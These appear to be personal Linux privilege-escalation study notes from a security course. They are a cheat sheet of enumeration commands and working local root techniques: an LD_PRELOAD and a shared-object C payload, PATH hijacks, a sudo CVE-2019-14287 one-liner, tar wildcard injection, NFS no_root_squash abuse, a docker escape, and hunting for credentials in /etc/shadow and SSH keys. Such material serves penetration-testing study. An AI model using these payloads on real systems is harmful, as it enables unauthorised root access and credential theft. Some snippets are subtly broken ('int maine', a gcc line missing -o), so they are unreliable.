#First do local box enumeration
	1. uname -a: print out all information about the system such as distro type and version.

	2. ~/.bash_history: If you have read permissions, then look into this file.
	
	3. .bash_profile and .bashrc: contains shell commands that are run when bash is invoked. These files can contain some interesting start up setting that can potentially reveal us some infromation. For example a bash alias can be pointed towards an important file or process.

	4. sudo -V: shows sudo version.
	5. sudo -l: list binaries which can be run with sudo permissions.

	#Check whether /etc/ directory is writable
	1. Read /etc/passwd - for enumeration of user accounts
	2. Read /etc/shadow - If possible - contains hashes for users.
	3. Read /etc/hosts - to enumerate network further.

	#Check cronjobs if there are running any
	>cat /etc/crontab

	#Find command and interesting files
	-> find / -type f -name "" 2>/dev/null
	-> Look for .log, .bak, .conf files and other some important files.

	#SUID
	>find / -type f -perm -u=s 2>/dev/null

	#TCP connections
	>netstat -at | less
	>netstat -tulpn: will provide much nice output with the most-interesting data.
	>ss -tulnp
		ss: socket statistics
		-t: display tcp sockets
		-u: display udp sockets
		-l: display only listening sockets
		-p: shows the process using the socket
		-n: doesnt resolve service names.

	#Automating Scripts
	Linpeas.sh
	LinEnum.sh


-----------------------------------------------------------------------------------
Manual Methods - (From Linux Privilege Escalation from TCM)
	
	Useful Links or Cheatsheets:
		-> https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
		-> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
		-> https://book.hacktricks.xyz/linux-unix/privilege-escalation
		-> https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
		-> https://github.com/TCM-Couse-Resources/Linux-Privilege-Escalation-Resources

	Initial Enumeration
		-> System Enumeration
			>uname -a : print out information about kernerl version and architecture.
			>cat /proc/version : similar to uname 
			>cat /etc/issue : to look for distribution
			>lscpu : to look for architecture.
				-> Use this command and note down the cores, threads and check with the exploit whether the exploit can run with the number of cores and threads present.
			>ps aux : list down all the processes or services running on the system.
			>ps aux | grep [Username] : lists processes run by specified username.

		-> User Enumeration
			>whoami
			>id
			>sudo -l - privileges user have
			>cat /etc/passwd - list users
			>cat /etc/passwd | cut -d : -f 1 - list just users
			>history - history of commands used by the user.
			>sudo su - : to change to root user.

			-> Look for sensitive files
				>cat /etc/shadow
				>cat /etc/group

			Note: First few things to do: check the architecture, who are you, any sudo permissions, history.

		-> Network Enumeration
			>ifconfig/ip a : ip information
			>route/ip route : routing information
			>arp -a/ip neigh : arp information
			>netstat -ano/ss -tulnp : open sockets and ports.

		-> Password Hunting
			>grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
				-> Here the query string PASSWORD can also be PASSWORD=,PASS=,PASS etc to narrow down search.
			>locate password | more
				-> file can be password,pwd,pass,passwd or anything along those lines.
			>find / -name id_rsa/authorized_keys 2>/dev/null 
				-> look if we have permissions to read a ssh key.


	Exploring Automated tools
		-> Always run multiple tools to catch that one little prick from the haystack.
		-> Start with Linpeas and then go to linEnum.
		-> Also run linux exploit suggester if you find kernel vulnerabilities.
		-> If these 3 didnt give you any results, then run linuxprivchecker.py if the target has python installed.
	
	
	Escalation Path: Kernel Exploits
		-> What is a kernel?
			-> A computer program that controls everything in the system.
			-> Facilitates interactions between hardware and software components.
			-> A translator.
		-> First step:
			>uname -a
			-> Copy the kernel info and google if there are any exploits.
		-> If you dont find anything then you can run exploit-suggester.



	Escalation Path: Stored Passwords & Weak file permissions.
		
		Stored Passwords:
			>history
			>cat .bash_history
			-> Go to payloads all the things and go to looting for passwords and there would be some commands you can run to loot passwords.
			-> Run linpeas, linenum.

		Weak File Permissions:
			>ls -la [sensitive files] - like passwd, shadow files.
			-> If we are allowed to edit passwd file, we can edit the placeholder 'x' of root user and insert our own hash and escalate.
			-> We can change our user id to 0 or group id to 0 to become root user.
			-> Also, for cracking hashes, copy the contents of passwd file to your attacker box and also the contents of shadow file and save both of these in two separate files.
			-> Then, using unshadow tool which is a built in tool in kali
				>unshadow [passwd file] [shadow file]
			-> Copy the contents of the tool output, just keep the user and root hashes and supply the hash to john or hashcat.

		Hunting for SSH keys/passwords
			>find / -name authorized_keys 2>/dev/null
			>find / -name id_rsa 2>/dev/null
			 


	Escalation Path: Sudo

		Shell Escaping
			>sudo -l
			-> search for those binaries in gtfobins which are vulnerable for shell escape.

		Abusing Intended functionality
			-> For example, if apache2 is allowed to run as sudo, then we can abuse apache2's intended functionality.
			-> We cant get a shell from apache2 but we can use this to read system files.
			>sudo apache2 -f /etc/shadow

		Abusing LD_PRELOAD
			-> In high level language we are preloading a library before we execute any other binary which we are allowed to run as sudo.
			-> For this purpose we will have to create a malicious file.
			>nano shell.c
				#include <stdio.h>
				#include <sys/types.h>
				#include <stdlib.h>

				void _init(){
					unsetenv("LD_PRELOAD");
					setgid(0);
					setuid(0);
					system("/bin/bash");

				}
			>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
			>sudo LD_PRELOAD=/home/user/shell.so apache2

		CVE-2019-14287
			-> check sudo -l
			-> If you find 
				(ALL, !root) /bin/bash
			-> exploit: sudo -u#-1 /bin/bash

		CVE-2019-18634 (Buffer Overflow)
			-> sudo version < 1.8.26
			-> check /etc/sudoers
			-> If you find "pwfeedback" in Defaults value then
				you will see astrisk when you type the password for any user
				>sudo su root
				[sudo] password for user: ***********
			-> Search for pwfeedback github exploit.
			-> Its a buffer overflow attack and you will directly get root shell.


	Escalation Path: SUID

		Overview
			-> finding suid binaries: find / -type f -perm -u=s 2>/dev/null
			-> If you find any binary which stands out, go to gtfobins to find if that binary is vulnerable.

		Escalation via Shared Object Injection
			-> First list all the suid binaries using this command:
				find / -type f -perm -4000 -ls 2>/dev/null
			-> run strace on binaries which look out of ordinary. 
				>strace [binary path] 2>&1
			-> Look what the binary is trying to access.
			-> More friendly output:
				>strace [binary path] 2>&1 | grep -i -E "open|access|no such file"
			-> If the binary is unable to find a file and we have write access to the location where the file is not present, then we can create a file with same name and elevate our priviliges.

			Malicious C program
				#include <stdio.h>
				#include <stdlib.h>

				static void inject() __attribute__((constructor));

				void inject(){
					system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

				}

			Compile: gcc -shared -fPIC -o [name of file which suid binary is unable to access] [name of file].c


		Escalation via Binary Symlinks
			Example: Versions of nginx < 1.6.2
			Find nginx version: dpkg -l | grep nginx
			For this exploit, you need suid bit set on sudo.
			-> We will take advantage as we have read write access as www-data in /var/log/nginx


		Escalation via environment variables
			-> Look at env variables: env
			-> Look at any uncommon suid binaries using find command.
			-> If you dont find anything related to that in gtfobins then
				>strings [suid binary]
			-> If you find just the name of the command instead of the full path associated with it like this: service apache2 start, then
				1. create a file with same name and include a root shell one liner like this.
				>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
				2. Compile the c code: gcc /tmp/service.c -o /tmp/service
				3. Include path of tmp directory in PATH variable:
					>export PATH=/tmp:$PATH
				4. Now run the vulnerable binary.

			Path 2:
				-> If the binary has full path of the file in strings output, then you can abuse the function.
				>function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
				-> Here /usr/sbin/service is name of the file which is being called in the suid binary.
				>export -f /usr/sbin/service
				-> Now run the vuln binary.
				-> For this to work, you must be able to create function and export them and also the suid bit should be set on the vuln binary.	


	Escalation Path: Capabilities

		Overview
			-> finding capabilities: getcap -r / 2>/dev/null

		Escalation
			Example: python
			>/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
			-> Google the capabilities with the binary if something stands out.
			-> Also gtfobins has all the capabilities.


	Escalation Path: Scheduled tasks

		Cron Jobs and Systemd timers
			>cat /etc/crontab
			>crontab -l
			>systemctl list-timers --all

		Escalation using Cron Paths
			-> If any cron job is running and that file doesnt exist in directory, then create a file with same name and make it execute something malicious.

		Escalation using Cron Wildcards
			-> Example shown was about exploiting tar wildcard.
			-> If the cron job is running a bash script and in that if you find
				tar czf /tmp/backup.tar.gz *
				then there is a wildcard exploitation vuln present.
				Example:
				>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
				>chmod +x shell.sh
				>touch /home/andre/backup/--checkpoint=1
				>touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
				>/tmp/bash -p


		Escalation using file overwrites
			-> Check what permissions is there for the cron script.
			-> Add local box priv esc one liner into the script or else you can add bash one liner rev shell to the script.


	Escalation using NFS squashing

		>cat /etc/exports
		-> You will find 
			/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
		-> no_root_squash here means this tmp folder can be mounted and shareable.
		-> From your attacker machine
			>showmount -e [IP]
			>mkdir /tmp/mountme
			>mount -o rw,vers=2 [IP]:/tmp /tmp/mountme
		-> Now we will do something malicious
			>echo 'int maine() { setgid(0); setuid(0); system("/bin/bash"); return 0;}'> /tmp/mountme/x.c
			>gcc /tmp/mountme/x.c /tmp/mountme/x
			Note: Ignore the warnings
			>chmod +s /tmp/mountme/x
		-> Now on the victim machine, go to tmp folder and and execute the x 
			> ./x
		-> You will have root shell.

		no_root_squash means as a remote user you have root access to the system and root_squash means you dont have that access.


	Escalation using Docker
		-> If the user is in docker group and the machine is hosting docker then it can be misused to get root shell.
		-> Using gtfobins
			>docker run -v /:/mnt --rm -it [Image running on machine] chroot /mnt sh


